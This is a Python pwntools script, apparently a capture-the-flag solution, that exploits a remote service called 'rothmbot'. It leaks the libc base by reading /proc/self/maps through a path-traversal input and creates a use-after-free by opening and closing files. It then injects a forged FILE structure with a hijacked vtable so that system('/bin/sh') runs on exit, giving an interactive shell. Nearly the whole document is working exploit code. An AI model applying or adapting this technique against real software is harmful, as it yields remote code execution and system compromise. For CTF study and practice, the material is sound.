from pwn import *
import tty

#init

e = ELF('./rothmbot')
libc = ELF('./libc-2.27.so')

context.binary = e

#p = process(e.path)
p = remote('147.182.172.217', 42010)

#funcs

def fop(x, s):
    p.sendlineafter('?', '1')
    p.sendlineafter('?', str(x))
    p.sendlineafter('?', '..' + s)

def fcl(x):
    p.sendlineafter('?', '2')
    p.sendlineafter('?', str(x))

def frd(x, y):
    p.sendlineafter('?', '3')
    p.sendlineafter('?', str(x))
    p.sendlineafter('?', str(y))

def rd(x):
    p.sendlineafter('?', '4')
    p.sendlineafter('?', str(x))
    p.recvuntil(':\n')

def ex():
    p.sendlineafter('?', '5')

#vars

lock_off = 0x3ed8d0
strjumps_off = 0x3e8360
stdin_off = libc.sym['_IO_2_1_stdin_']
system_off = libc.sym['system']
binsh_off = next(libc.search(b'/bin/sh'))

log.info('Lock libc off: ' + hex(lock_off))
log.info('Jumps libc off: ' + hex(strjumps_off))
log.info('Stdin libc off: ' + hex(stdin_off))
log.info('System libc off: ' + hex(system_off))
log.info('Binsh libc off: ' + hex(binsh_off))

#exploit

#leak libc off with /proc/self/maps

fop(0, '/proc/self/maps')
frd(0, 0x800)
rd(0)

p.recvuntil('[heap]\n')
libc_off = int(p.recvuntil('-', drop = True), 16)

log.info('Libc off adr: ' + hex(libc_off))

#open and close 2 file for uaf

for i in range(2):
    fop(i + 1, '/songs/song1.txt')

for i in range(2):
    fcl(i + 1)

#read from /proc/self/fd/0 to put fsop input on uaf file chnk

fop(3, '/proc/self/fd/0')
frd(3, 0x227)

f = FileStructure(libc_off + lock_off)
f._IO_read_ptr = libc_off + stdin_off
f._IO_write_ptr = (libc_off + binsh_off - 100) // 2
f._IO_buf_end =  (libc_off + binsh_off - 100) // 2
f.vtable = libc_off + strjumps_off + 0x8

#log.info('File struct:\n' + str(f))

s = bytes(f)
s += p64(libc_off + system_off)
s = s.ljust(0x226, b'\x00')

p.sendline(s)

#close fake file chnk on exit to call system('/bin/sh')

frd(1, 0x10)
ex()

#pray for flag

p.interactive()
